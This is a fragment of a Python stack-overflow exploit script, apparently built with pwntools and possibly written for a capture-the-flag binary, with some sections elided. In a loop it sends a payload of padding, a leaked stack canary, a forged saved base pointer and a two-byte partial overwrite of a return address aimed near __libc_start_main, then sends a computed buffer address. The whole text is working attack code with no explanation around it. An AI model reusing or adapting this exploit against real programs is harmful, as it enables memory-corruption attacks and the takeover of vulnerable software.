...
while True:
    ...
    buf = b"A" * 0x78 # right before fake rbp
    fake_rbp = input_buffer + 0xa0
    #payload = padding + p64(canary) + p64(fake_rbp) + pack(leave_ret, 24)
    payload = buf + p64(canary) + p64(input_buffer + 0xa8+ 0x70) + p16(0x4069) # libc_start_main:0x24069
    p.send(payload)
    sleep(0.5)
    s = p.wait(timeout=10)
    all = p.recv()
...
p.sendline(hex(input_buffer + 0xa8))
p.recvuntil("= ")
